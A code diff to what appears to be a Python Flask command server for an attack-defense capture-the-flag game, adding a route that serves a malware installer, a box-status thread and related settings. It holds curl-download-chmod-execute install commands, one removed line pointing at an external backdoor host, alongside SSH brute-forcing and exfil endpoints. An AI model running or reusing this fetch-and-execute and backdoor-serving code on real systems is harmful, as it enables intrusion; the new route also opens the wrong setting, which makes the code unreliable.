@@ -5,7 +5,7 @@ import socket
 import string
 import time
 from base64 import b64decode
-from datetime import datetime
+from datetime import datetime, timedelta
 from threading import Thread
 
 import paramiko
@@ -25,7 +25,11 @@ THREADS = []
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
-DEFAULT_MALWARE_INSTALL = "curl -o installer http://test.alberttaglieri.us/USSDelogrand/combat/backdoors/installer && chmod +x installer && ./installer"
+DEFAULT_MALWARE_PATH = "installer"
+DEFAULT_MALWARE_INSTALL = "curl -o installer http://localhost/i && chmod +x installer && ./installer"
+DEFAULT_STATUS_PWNED_TIMEOUT = "300"
+DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
+DEFAULT_STATUS_INTERVAL = "10"
 DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
 DEFAULT_SPAM_INTERVAL_MIN = "5"
@@ -51,7 +55,13 @@ def main():
     add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                 "IPs, separated by commas and no spaces, that are allowed to access admin site")
     add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
+    add_setting("malware_path", DEFAULT_MALWARE_PATH, "Path to first stage of binary")
     add_setting("malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
+    add_setting("status_pwned_timeout", DEFAULT_STATUS_PWNED_TIMEOUT,
+                "Timeout, in seconds, when to stop assuming box is pwned")
+    add_setting("status_flags_timeout", DEFAULT_STATUS_FLAGS_TIMEOUT,
+                "Timeout, in seconds, when to stop assuming box is getting flags")
+    add_setting("status_interval", DEFAULT_STATUS_INTERVAL, "Seconds to wait between each status check")
     add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
                 "Seconds to wait between each SSH bruteforce")
     add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
@@ -62,6 +72,7 @@ def main():
     add_setting("spam_rand_file", DEFAULT_SPAM_RAND_FILE, "Path to file with random strings line by line")
 
     # Start threads
+    THREADS.append(Thread(target=status, name="status"))
     THREADS.append(Thread(target=ssh_bruteforce, name="ssh_bruteforce"))
     THREADS.append(Thread(target=spam, name="spam"))
     for thread in THREADS:
@@ -552,6 +563,14 @@ def admin_ssh_passwords_update():
 
 # <editor-fold desc="Malware Endpoints">
 
+# Install route
+@app.route("/i", methods=["GET"])
+def update():
+    with open(Setting.query.get("malware_path", "r")) as f:
+        data = f.read()
+    return data
+
+
 # Exfil route
 @app.route("/e", methods=["POST"])
 def exfil():
@@ -637,6 +656,54 @@ def update():
 # </editor-fold>
 
 # <editor-fold desc="Thread Functions">
+
+def status():
+    # Continue checking
+    while True:
+
+        # Get settings from database
+        try:
+            pwned_timeout = int(Setting.query.get("status_pwned_timeout").value)
+        except:
+            log("status", "Invalid status_pwned_timeout setting")
+            pwned_timeout = DEFAULT_STATUS_PWNED_TIMEOUT
+        try:
+            flags_timeout = int(Setting.query.get("status_flags_timeout").value)
+        except:
+            log("status", "Invalid status_flags_timeout setting")
+            flags_timeout = DEFAULT_STATUS_FLAGS_TIMEOUT
+        try:
+            interval = int(Setting.query.get("status_interval").value)
+        except:
+            log("status", "Invalid status_interval setting")
+            interval = DEFAULT_STATUS_INTERVAL
+
+        # Get all boxes
+        boxes = Box.query.all()
+
+        # Iterate over boxes
+        for box in boxes:
+
+            # Check if still pwned
+            if box.pwned:
+                delta = box.last_update + timedelta(seconds=pwned_timeout)
+                if delta < datetime.now():
+                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer pwned")
+                    box.pwned = False
+                    db.session.commit()
+
+            # Check if still getting flags
+            if box.flags:
+                delta = box.last_flag + timedelta(seconds=flags_timeout)
+                if delta < datetime.now():
+                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer getting flags")
+                    box.flags = False
+                    db.session.commit()
+
+        # Wait until next check
+        log("status", f"sleeping for {interval} seconds")
+        time.sleep(interval)
+
 
 def ssh_bruteforce():
     # Continue trying
